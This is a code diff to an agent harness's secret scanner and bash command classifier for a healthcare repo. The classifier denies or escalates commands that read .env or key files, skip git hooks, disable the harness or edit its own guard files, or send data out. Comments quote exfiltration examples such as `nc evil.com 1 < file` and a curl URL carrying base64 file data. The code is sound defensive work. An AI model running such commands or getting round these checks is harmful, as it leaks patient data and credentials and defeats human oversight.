@@ -85,7 +85,9 @@ export type FindingKind =
   | "cloud-key"
   | "vendor-token"
   | "db-url-password"
-  | "high-entropy-secret";
+  | "high-entropy-secret"
+  /** Larger than {@link MAX_SCAN_CHARS}: not scanned, so it is not vouched for either. */
+  | "unscannable";
 
 export interface Finding {
   readonly kind: FindingKind;
@@ -97,7 +99,7 @@ export interface Finding {
 const redact = (v: string): string => `${v.length} chars`;
 
 const SSN_DASHED = /\b(\d{3})-(\d{2})-(\d{4})\b/g;
-const SSN_KEYED = /\bssn\b[^0-9\n]{0,6}(\d{9})\b/gi;
+const SSN_KEYED = /\bssn\b[^0-9\n]{0,6}(\d{3}[- ]?\d{2}[- ]?\d{4})\b/gi;
 // CMS MBI format: C A AN N A AN N A A N N — letters exclude S L O I B Z. Upper-case only (MBIs are
 // upper-case by spec, and a case-insensitive match would trip on hex hashes).
 const MBI_L = "[AC-HJKMNP-RT-Y]";
@@ -133,14 +135,31 @@ const CREDENTIAL_RULES: ReadonlyArray<readonly [RegExp, FindingKind]> = [
 
 /** A postgres URL carrying an inline password for a host that is not local/compose-internal. */
 const DB_URL = /\bpostgres(?:ql)?:\/\/[^:\s/@]+:([^@\s]+)@([^/:\s?#'"`]+)/g;
-const LOCAL_HOST =
-  /^(localhost|127\.0\.0\.1|\[?::1\]?|0\.0\.0\.0|host\.docker\.internal|[a-z0-9_-]+|.*\.(local|internal|test|localhost|example))$/i;
+// Local means loopback, the Docker host alias, or a service this repo's docker-compose.yml names. A bare
+// single-label name or a `*.internal` suffix is NOT local: production hosts look exactly like that.
+const LOCAL_HOST_RE =
+  /^(localhost|127(\.\d{1,3}){3}|\[?::1\]?|0\.0\.0\.0|host\.docker\.internal|[a-z0-9-]+\.localhost)$/i;
+/** Service names in docker-compose.yml (reachable only on the private compose network). */
+export const COMPOSE_SERVICES: ReadonlySet<string> = new Set([
+  "postgres",
+  "redis",
+  "minio",
+  "clamav",
+  "migrate",
+  "api",
+  "worker",
+  "docling-worker",
+  "provision-gateway",
+]);
+const LOCAL_HOST = {
+  test: (h: string): boolean => LOCAL_HOST_RE.test(h) || COMPOSE_SERVICES.has(h.toLowerCase()),
+};
 const PLACEHOLDER =
-  /^(\$\{?[A-Z_]+\}?|<[^>]+>|\*+|x+|password|postgres|changeme|secret|pass|chartwarden(-(local|dev|test|ci|e2e)[A-Za-z0-9_-]*)?)$/i;
+  /^(\$\{?[A-Z_]+\}?|<[^>]+>|\*+|x+|\.{1,3}|\u2026|.{1,3}|password|postgres|changeme|secret|pass|chartwarden(-(local|dev|test|ci|e2e)[A-Za-z0-9_-]*)?)$/i;
 
 /** `SECRET=...`-style assignment with a long, high-entropy literal. Applied to non-test paths only. */
 const KEYED_SECRET =
-  /\b[A-Z0-9_]*(?:SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY)[A-Z0-9_]*\s*[:=]\s*["'`]?([A-Za-z0-9+/=_.-]{32,})["'`]?/g;
+  /\b[A-Z0-9_]{0,64}(?:SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY)[A-Z0-9_]{0,64}\s{0,8}[:=]\s{0,8}["'`]?([A-Za-z0-9+/=_.-]{32,})["'`]?/g;
 
 export function shannonEntropy(s: string): number {
   const counts = new Map<string, number>();
@@ -169,8 +188,18 @@ function lineOf(text: string, index: number): number {
   return n;
 }
 
+/**
+ * Largest text one scan will take. Every rule here is linear in the input (the keyed-secret rule bounds
+ * its prefix and suffix), so this is a second line, not the first: content past it is REFUSED by the
+ * callers that write (the guard) and reported as skipped by the ones that read (phi-scan, Stop gate).
+ */
+export const MAX_SCAN_CHARS = 8_000_000;
+
 export function scanContent(text: string, registry: SyntheticRegistry, path = ""): Finding[] {
   if (path && !isScannable(path)) return [];
+  if (text.length > MAX_SCAN_CHARS) {
+    return [{ kind: "unscannable", line: 1, sample: redact(text) }];
+  }
   const out: Finding[] = [];
   const push = (kind: FindingKind, index: number, value: string) =>
     out.push({ kind, line: lineOf(text, index), sample: redact(value) });
@@ -181,7 +210,8 @@ export function scanContent(text: string, registry: SyntheticRegistry, path = ""
     push("ssn", m.index ?? 0, whole);
   }
   for (const m of text.matchAll(SSN_KEYED)) {
-    const v = m[1] ?? "";
+    if (/^\d{3}-\d{2}-\d{4}$/.test(m[1] ?? "")) continue; // the dashed rule above already judged it
+    const v = (m[1] ?? "").replace(/\D/g, "");
     if (ssnNeverIssued(v.slice(0, 3), v.slice(3, 5), v.slice(5)) || registry.ssn.has(v)) continue;
     push("ssn", m.index ?? 0, v);
   }
@@ -196,6 +226,8 @@ export function scanContent(text: string, registry: SyntheticRegistry, path = ""
     const pw = m[1] ?? "";
     const host = m[2] ?? "";
     if (LOCAL_HOST.test(host) || PLACEHOLDER.test(pw)) continue;
+    // A short dummy in a test file (`p@ss`) is a fixture; a real-length password is flagged everywhere.
+    if (TESTISH.test(path) && pw.length < 8) continue;
     push("db-url-password", m.index ?? 0, pw);
   }
   if (!TESTISH.test(path)) {
@@ -204,6 +236,32 @@ export function scanContent(text: string, registry: SyntheticRegistry, path = ""
       if (PLACEHOLDER.test(v) || shannonEntropy(v) < 4.0) continue;
       push("high-entropy-secret", m.index ?? 0, v);
     }
+  }
+  return out;
+}
+
+const CHUNK_CHARS = 4_000_000;
+
+/**
+ * {@link scanContent} for FILES that may exceed one scan's limit (a generated 12 MB OpenAPI document):
+ * scanned in line-aligned chunks so size alone never exempts a file. A single line past the limit is
+ * still reported as `unscannable`.
+ */
+export function scanLarge(text: string, registry: SyntheticRegistry, path = ""): Finding[] {
+  if (text.length <= MAX_SCAN_CHARS) return scanContent(text, registry, path);
+  const out: Finding[] = [];
+  let start = 0;
+  let lineBase = 0;
+  while (start < text.length) {
+    let end = Math.min(start + CHUNK_CHARS, text.length);
+    if (end < text.length) {
+      const nl = text.indexOf("\n", end);
+      end = nl < 0 ? text.length : nl + 1;
+    }
+    const chunk = text.slice(start, end);
+    for (const f of scanContent(chunk, registry, path)) out.push({ ...f, line: f.line + lineBase });
+    for (let i = chunk.indexOf("\n"); i >= 0; i = chunk.indexOf("\n", i + 1)) lineBase++;
+    start = end;
   }
   return out;
 }
@@ -217,7 +275,9 @@ export function describeFindings(path: string, findings: readonly Finding[]): st
   const phi = kinds.some((k) => k === "ssn" || k === "mbi");
   const advice = phi
     ? "Use a value from compliance/synthetic-identifiers.json, or an SSN with area 000/666/9xx. Adding a new synthetic value to that file is a human decision."
-    : "Credentials never go in the repo: read them from the environment (OpenBao in production) and put a placeholder in the .example template.";
+    : kinds.includes("unscannable")
+      ? "This content is too large to scan, so it cannot be vouched for. Write it in smaller pieces, or keep it out of the repo."
+      : "Credentials never go in the repo: read them from the environment (OpenBao in production) and put a placeholder in the .example template.";
   return `${kinds.join(", ")} found — ${where}. ${advice}`;
 }
 
@@ -237,6 +297,8 @@ export interface BashContext {
   readonly branch?: string;
   /** Does this (cwd-relative) path exist? Lets `cat tls.key` be refused while `jq '.key'` is not. */
   readonly exists?: (path: string) => boolean;
+  /** Absolute repo root, so an absolute path to a protected file is judged like the relative one. */
+  readonly root?: string;
 }
 
 /** Split a command line into simple commands on `;`, `&&`, `||`, `|` and newlines, outside quotes. */
@@ -271,8 +333,44 @@ function segments(cmd: string): string[] {
     cur += ch;
   }
   out.push(cur);
-  return out.map((x) => x.trim()).filter(Boolean);
+  // `(cat .env)` and `{ cat .env; }`: the grouping characters are not part of the command.
+  return out.map((x) => x.replace(/^[\s({]+|[\s)}]+$/g, "")).filter(Boolean);
 }
+
+/**
+ * The text inside every `$( … )` and backtick pair that the shell would actually run (single quotes
+ * make them literal). Each one is judged as its own command line, so `echo $(cat .env)` is the `cat`.
+ */
+function substitutions(cmd: string): string[] {
+  const out: string[] = [];
+  let single = false;
+  for (let i = 0; i < cmd.length; i++) {
+    const ch = cmd[i] as string;
+    if (ch === "'") single = !single;
+    if (single) continue;
+    if (ch === "`") {
+      const end = cmd.indexOf("`", i + 1);
+      if (end < 0) break;
+      out.push(cmd.slice(i + 1, end));
+      i = end;
+      continue;
+    }
+    if (ch === "$" && cmd[i + 1] === "(" && cmd[i + 2] !== "(") {
+      let depth = 1;
+      let j = i + 2;
+      for (; j < cmd.length && depth > 0; j++) {
+        if (cmd[j] === "(") depth++;
+        else if (cmd[j] === ")") depth--;
+      }
+      out.push(cmd.slice(i + 2, j - 1));
+      i += 1; // keep scanning inside, so nested substitutions are found too
+    }
+  }
+  return out;
+}
+
+/** `bash -c "…"`, `sh -c '…'`, `eval …`: the quoted string is itself a command line. */
+const NESTED_SHELL = /^(bash|sh|zsh|dash|ksh|fish)$/;
 
 /**
  * Shell words, keeping a quoted string as one word (quotes stripped), also INSIDE a word: in
@@ -305,11 +403,73 @@ function program(seg: string): { prog: string; args: string[]; assigns: string[]
   };
 }
 
-/** File-ish arguments: not flags, not globs or expansions, quotes stripped. */
+/**
+ * File-ish arguments: not flags, quotes and redirection operators stripped (`<.env` reads it, `>.env`
+ * writes it). Globs and expansions are KEPT: the name tests below look only at how the word ends, and
+ * {@link globReachesSecret} judges the wildcards.
+ */
 function fileArgs(args: readonly string[]): string[] {
   return args
-    .map((t) => t.replace(/^['"`]+|['"`]+$/g, "").replace(/^--?[a-z-]+=/i, ""))
-    .filter((t) => t && !t.startsWith("-") && !/[*?$(){}<>]/.test(t));
+    .map((t) =>
+      t
+        .replace(/^['"`]+|['"`]+$/g, "")
+        .replace(/^--?[a-z-]+=/i, "")
+        .replace(/^[<>]+/, ""),
+    )
+    .filter((t) => t && !t.startsWith("-"));
+}
+
+/** Names a live secret file can have; a wildcard that expands onto any of them reads one. */
+const SECRET_NAME_SAMPLES = [
+  ".env",
+  ".env.local",
+  ".env.production",
+  ".env.staging",
+  ".env.development",
+  ".env.tenant",
+  "backend.env",
+  ".pgpass",
+  ".netrc",
+  "id_rsa",
+  "id_ed25519",
+  "tls.key",
+  "server.pem",
+];
+
+/** Does the wildcard word `t` expand onto a secret file name? (`.e*`, `.env?*`, `.[e]nv`, `*.env`). */
+export function globReachesSecret(t: string): boolean {
+  if (!/[*?[]/.test(t)) return false;
+  const base = t.replace(/^.*\//, "");
+  // A wildcard with nothing literal to anchor it (`*`, `feat/*`, `???`) names no secret in particular.
+  const literals = base.split(/[*?]|\[[^\]]*\]/);
+  if (!base.startsWith(".") && !literals.some((l) => l.length >= 2)) return false;
+  let re = "";
+  for (let i = 0; i < base.length; i++) {
+    const ch = base[i] as string;
+    if (ch === "*") re += ".*";
+    else if (ch === "?") re += ".";
+    else if (ch === "[") {
+      const end = base.indexOf("]", i + 1);
+      if (end < 0) re += "\\[";
+      else {
+        re += `[${base
+          .slice(i + 1, end)
+          .replace(/^!/, "^")
+          .replace(/\\/g, "\\\\")}]`;
+        i = end;
+      }
+    } else re += ch.replace(/[.+^${}()|\\]/g, "\\$&");
+  }
+  let rx: RegExp;
+  try {
+    rx = new RegExp(`^${re}$`);
+  } catch {
+    return false;
+  }
+  // The shell never lets a leading `*`, `?` or `[` match a leading dot.
+  return SECRET_NAME_SAMPLES.some(
+    (n) => rx.test(n) && !(n.startsWith(".") && !base.startsWith(".")),
+  );
 }
 
 /** Dotfiles that are secret by NAME alone, wherever they appear. */
@@ -416,23 +576,98 @@ function gitBranchIsReadOnly(rest: readonly string[]): boolean {
 const deny = (reason: string): BashVerdict => ({ decision: "deny", reason });
 const ask = (reason: string): BashVerdict => ({ decision: "ask", reason });
 
-export function classifyBash(cmd: string, ctx: BashContext = {}): BashVerdict {
+const MAX_NESTING = 4;
+
+export function classifyBash(cmd: string, ctx: BashContext = {}, depth = 0): BashVerdict {
   const c = cmd.trim();
+  if (depth > MAX_NESTING) {
+    return ask("Command substitutions or `bash -c` nested too deeply to check; a human decides.");
+  }
   const segs = segments(c);
 
   // --- Gate bypasses: always refused. The pre-push hook and CI are the change-management control.
-  if (/\bSKIP_FITNESS=1\b|\bCW_SKIP_PHI_SCAN=1\b/.test(c)) {
+  if (/\b(SKIP_FITNESS=(1|true|yes)|CW_SKIP_PHI_SCAN=(1|true|yes))\b/.test(c)) {
     return deny("Skipping the fitness gate or PHI scan is a human decision, not an agent one.");
+  }
+  // --- Switching the harness itself off is the human's call, however it is spelled.
+  if (
+    /\b(CW_STOP_GATE|CW_AGENT_LEDGER|CW_HARNESS_FAIL_OPEN|ECC_DISABLED_HOOKS|ECC_GATEGUARD)=/.test(
+      c,
+    )
+  ) {
+    return ask(
+      "That variable switches off part of the agent harness (Stop gate, ledger, guard fail-closed or an ECC hook). A human decides.",
+    );
   }
 
   // Every simple command is judged; any deny wins, else the first ask, else allow.
-  const verdicts = segs
+  const verdicts: BashVerdict[] = segs
     .map((seg) => classifySegment(seg, ctx))
     .filter((v): v is BashVerdict => v !== null);
+  // Commands the shell runs INSIDE this one: `$( … )`, backticks, `bash -c '…'`, `eval …`.
+  for (const inner of substitutions(c)) verdicts.push(classifyBash(inner, ctx, depth + 1));
+  for (const seg of segs) {
+    const { prog, args } = program(seg);
+    if (prog === "eval") verdicts.push(classifyBash(args.join(" "), ctx, depth + 1));
+    else if (NESTED_SHELL.test(prog)) {
+      const k = args.findIndex((a) => /^-[a-z]*c$/.test(a));
+      if (k >= 0) verdicts.push(classifyBash(args[k + 1] ?? "", ctx, depth + 1));
+    }
+  }
   return (
     verdicts.find((v) => v.decision === "deny") ??
     verdicts.find((v) => v.decision === "ask") ?? { decision: "allow", reason: "" }
   );
+}
+
+const INTERPRETER = /^(python[0-9.]*|node|bun|deno|perl|ruby|php|awk|gawk|lua)$/;
+const INLINE_CODE = /\s(-c|-e|-p|-E|--eval|--print)\b/;
+/** awk always takes its program inline; the others only behind -c/-e/-p/--eval. */
+const runsInlineCode = (prog: string, args: readonly string[]): boolean =>
+  INTERPRETER.test(prog) && (/^g?awk$/.test(prog) || INLINE_CODE.test(` ${args.join(" ")}`));
+// A secret file named inside inline code. `process.env.X` is a property, not a file: the dot must not
+// follow a letter, `)` or `]`.
+const SECRET_MENTION =
+  /(?:^|[^A-Za-z0-9_$)\]])\.(?:env(?!\.example)(?:\.[A-Za-z]+)?|pgpass|netrc)(?![A-Za-z0-9_])|['"/][\w-]+\.env(?:\.(?:local|development|staging|production|tenant))?['"]|id_(?:rsa|ed25519|ecdsa)|\.ssh\/|\.aws\/credentials|['"/][\w.-]*\.(?:pem|key|p12|pfx)['"]/;
+
+/** The agent's own guard, ledger, approved lists and the compliance record. */
+const PROTECTED_PATH =
+  /^(\.\/)?(\.claude\/(audit|\.cache|rules|agents|skills)(\/|$)|\.claude\/settings(\.local)?\.json$|scripts\/harness(\/|$)|compliance(\/|$)|\.githooks(\/|$)|\.gitleaks\.toml$|scripts\/check-compliance-controls\.ts$|\.github\/CODEOWNERS$)/;
+const WRITER =
+  /^(rm|mv|cp|tee|truncate|dd|ln|install|chmod|chown|touch|sed|perl|awk|gawk|ed|ex|vi|vim|nano|patch|rsync|unlink|shred|mkdir)$/;
+
+function writesProtectedPath(
+  prog: string,
+  args: readonly string[],
+  ctx: BashContext,
+): string | null {
+  const rel = (t: string) =>
+    ctx.root && t.startsWith(`${ctx.root}/`) ? t.slice(ctx.root.length + 1) : t;
+  const hit = (t: string) => (PROTECTED_PATH.test(rel(t)) ? rel(t) : null);
+  // `> file`, `>> file`, `2>file`: redirection writes whatever the program is.
+  for (let k = 0; k < args.length; k++) {
+    const m = /^\d?>>?(.*)$/.exec(args[k] ?? "");
+    if (!m) continue;
+    const found = hit(m[1] || args[k + 1] || "");
+    if (found) return found;
+  }
+  if (WRITER.test(prog) || runsInlineCode(prog, args)) {
+    for (const t of fileArgs(args)) {
+      const found = hit(t) ?? (INTERPRETER.test(prog) ? findProtectedIn(t, ctx) : null);
+      if (found) return found;
+    }
+  }
+  return null;
+}
+
+/** A protected path quoted inside an inline-code argument, e.g. `open('.claude/settings.json','w')`. */
+function findProtectedIn(arg: string, ctx: BashContext): string | null {
+  for (const m of arg.matchAll(/['"]([^'"\s]+)['"]/g)) {
+    const t = m[1] ?? "";
+    const r = ctx.root && t.startsWith(`${ctx.root}/`) ? t.slice(ctx.root.length + 1) : t;
+    if (PROTECTED_PATH.test(r)) return r;
+  }
+  return null;
 }
 
 function classifySegment(seg: string, ctx: BashContext): BashVerdict | null {
@@ -452,7 +687,8 @@ function classifySegment(seg: string, ctx: BashContext): BashVerdict | null {
         "A GIT_* environment override (GIT_CONFIG_*, GIT_SSH_COMMAND, GIT_EXTERNAL_DIFF, GIT_PAGER, ...) changes what git runs or reads; a human decides.",
       );
     }
-    if (/\s--no-verify\b/.test(` ${argline}`)) {
+    // Git accepts any unambiguous abbreviation (`--no-verif`, `--no-ver`, `--no-v`), so match the prefix.
+    if (/\s--no-v[a-z-]*(?=\s|=|$)/.test(` ${argline}`)) {
       return deny(
         "`--no-verify` skips the repo's git hooks (the fitness gate and secret scan). Fix what the hook reports instead; a human can bypass deliberately outside the agent.",
       );
@@ -569,6 +805,11 @@ function classifySegment(seg: string, ctx: BashContext): BashVerdict | null {
   ) {
     for (const t of fileArgs(args)) {
       if (isCompose && SECRET_BY_NAME.test(t)) continue; // --env-file value for a lifecycle command
+      if (globReachesSecret(t)) {
+        return deny(
+          `\`${t}\` expands onto a live secret file (.env, key material). Name the file you need, and not a secret one.`,
+        );
+      }
       const byName = SECRET_BY_NAME.test(t);
       const pathLike = t.includes("/") || (ctx.exists?.(t) ?? false);
       if (!byName && !pathLike) continue;
@@ -581,11 +822,27 @@ function classifySegment(seg: string, ctx: BashContext): BashVerdict | null {
     }
   }
 
+  // --- Inline interpreter code that names a secret file: `python -c "open('.env').read()"`.
+  if (runsInlineCode(prog, args) && SECRET_MENTION.test(argline)) {
+    return deny(
+      "Inline code that opens a live secret file is the same read as `cat`. Agents do not read secrets or dumps.",
+    );
+  }
+
+  // --- The harness protecting itself: no shell edit of its own guard, ledger or approved lists.
+  const protectedHit = writesProtectedPath(prog, args, ctx);
+  if (protectedHit) {
+    return ask(
+      `\`${protectedHit}\` is part of the agent harness or the compliance record. Changing it through the shell skips the edit prompt, so a human approves it here.`,
+    );
+  }
+
   // --- Production data access. An agent session connecting to a non-local database is PHI access.
   if (/^(psql|pg_dump|pg_dumpall|pg_restore|pgcli)$/.test(prog)) {
     const hostFlag = /(?:^|\s)(?:-h\s*|--host[=\s])([^\s'"]+)/.exec(argline)?.[1];
     const urlHost = /postgres(?:ql)?:\/\/[^@\s]*@([^/:\s?'"]+)/.exec(argline)?.[1];
-    const host = hostFlag ?? urlHost;
+    const envHost = assigns.map((a) => /^PGHOST=(.*)$/.exec(a)?.[1]).find(Boolean);
+    const host = hostFlag ?? urlHost ?? envHost;
     if (host && !isLocalHost(host)) {
       return deny(
         `Connecting to database host \`${host}\` from an agent session is access to PHI. Agents work against local or private-container databases with synthetic data only.`,
@@ -605,7 +862,7 @@ function classifySegment(seg: string, ctx: BashContext): BashVerdict | null {
         fileArgs(args).find((a) => a.includes("@") || a.includes(":") || prog === "ssh") ?? "",
       );
     const host = m?.[1] ?? "";
-    if (host && !isLocalHost(host.includes(".") ? host : `${host}.remote`)) {
+    if (host && !isLocalHost(host)) {
       return ask(
         `Remote access to \`${host}\`. Production hosts hold PHI; confirm this is intended and that no PHI will enter the session.`,
       );
@@ -613,16 +870,43 @@ function classifySegment(seg: string, ctx: BashContext): BashVerdict | null {
   }
 
   // --- Outbound uploads: the exfiltration shape.
-  if (
-    /^(curl|wget|http|https|httpie)$/.test(prog) &&
-    /(\s-d\b|\s--data(-[a-z]+)?\b|\s-F\b|\s--form\b|\s-T\b|\s--upload-file\b|\s-X\s*(POST|PUT|PATCH)\b|--post-(data|file))/i.test(
-      ` ${argline}`,
-    )
-  ) {
+  if (/^(curl|wget|http|https|httpie)$/.test(prog)) {
     const host = /https?:\/\/([^/:\s'"]+)/.exec(argline)?.[1] ?? "";
+    const upload =
+      /(\s-d\b|\s--data(-[a-z]+)?\b|\s-F\b|\s--form\b|\s-T\b|\s--upload-file\b|\s-X\s*(POST|PUT|PATCH)\b|--post-(data|file))/i.test(
+        ` ${argline}`,
+      );
+    if (!isLocalHost(host)) {
+      if (upload) {
+        return ask(
+          `Sending data to \`${host || "a remote host"}\`. Confirm the payload carries no PHI or secrets.`,
+        );
+      }
+      // A plain GET can still carry data out in its URL or headers: `curl https://x/?d=$(base64 < f)`.
+      if (/\$\(|`|\$\{?[A-Za-z_]/.test(seg)) {
+        return ask(
+          `A request to \`${host || "a remote host"}\` that expands shell values or command output into it can carry PHI or secrets out. Confirm what is sent.`,
+        );
+      }
+    }
+  }
+  // Raw sockets: nothing in `nc evil.com 1 < file` looks like an upload to the checks above.
+  if (/^(nc|ncat|netcat|telnet|socat)$/.test(prog)) {
+    const host =
+      prog === "socat"
+        ? (/(?:TCP|SSL|OPENSSL)[46]?:([^:\s,]+)/i.exec(argline)?.[1] ?? "")
+        : (fileArgs(args).find((a) => !/^\d+$/.test(a)) ?? "");
     if (!isLocalHost(host)) {
       return ask(
-        `Sending data to \`${host || "a remote host"}\`. Confirm the payload carries no PHI or secrets.`,
+        `Opening a raw connection to \`${host || "a remote host"}\`. Confirm nothing from the repo or the environment is sent.`,
+      );
+    }
+  }
+  if (prog === "openssl" && args[0] === "s_client") {
+    const host = /-connect\s+([^:\s]+)/.exec(argline)?.[1] ?? "";
+    if (!isLocalHost(host)) {
+      return ask(
+        `Opening a TLS connection to \`${host || "a remote host"}\`. Confirm what is sent.`,
       );
     }
   }
